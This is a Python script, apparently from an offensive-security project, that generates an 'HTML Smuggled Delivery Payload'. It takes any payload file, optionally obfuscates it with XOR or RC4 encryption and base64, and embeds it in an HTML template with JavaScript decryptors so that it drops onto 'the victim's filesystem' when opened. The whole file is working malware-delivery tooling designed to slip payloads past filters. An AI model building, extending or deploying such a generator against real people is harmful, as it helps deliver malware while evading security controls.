import base64
import os
import argparse
from jinja2 import Environment, FileSystemLoader

from encryption import BaseEncryptor, XOREncryptor, RC4Encryptor

encryptionMap = {
    'xor': XOREncryptor,
    'rc4': RC4Encryptor,
    'plaintext': BaseEncryptor
}

def render_template_from_file(template_path, template_filename, *args, **kwargs):
    env = Environment(
        loader=FileSystemLoader(template_path)        
    )
    template = env.get_template(template_filename)
    return template.render(*args, **kwargs)

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="Generate an HTML Smuggled Delivery Payload")
    parser.add_argument('-p', '--payload', type=argparse.FileType('rb'), help="The payload to smuggle in the resulting HTML file", required=True)
    parser.add_argument('-t', '--template', default="templates/smuggle.html.j2")
    parser.add_argument('-m', '--mimetype', help="Force the mimetype of the file", default="application/octet-stream")
    parser.add_argument('-o', '--output', help="Write the output to a file, default is STDOUT", type=argparse.FileType('w'), default='-')
    parser.add_argument('--filename', help='The filename to save the payload as on the victim\'s filesystem. If not specified, will use the payload name')
    parser.add_argument('-e', '--encrypt', help='Encrypt using one of the available encryption modules', default='plaintext', choices=encryptionMap.keys())
    parser.add_argument('-k', '--key', help="Encrytpion Key", default='')

    args = parser.parse_args()

    tpath = os.path.abspath(args.template)
    tdir = os.path.dirname(tpath)
    tname = os.path.basename(tpath)

    filename = args.filename if args.filename else os.path.basename(args.payload.name)
    # payload = args.payload.read().encode('unicode_escape').decode('utf-8')
    
    encryptor = encryptionMap.get(args.encrypt)
    ciphertext = base64.b64encode(encryptor.encrypt(args.payload.read(), args.key)).decode('utf-8')

    payload_js = render_template_from_file(os.path.abspath('./templates/javascript/encryption/'), f'{args.encrypt}.js.j2')

    args.output.write(render_template_from_file(tdir, tname, payload_js=payload_js, key=args.key, ciphertext=ciphertext, filename=filename, mimetype=args.mimetype))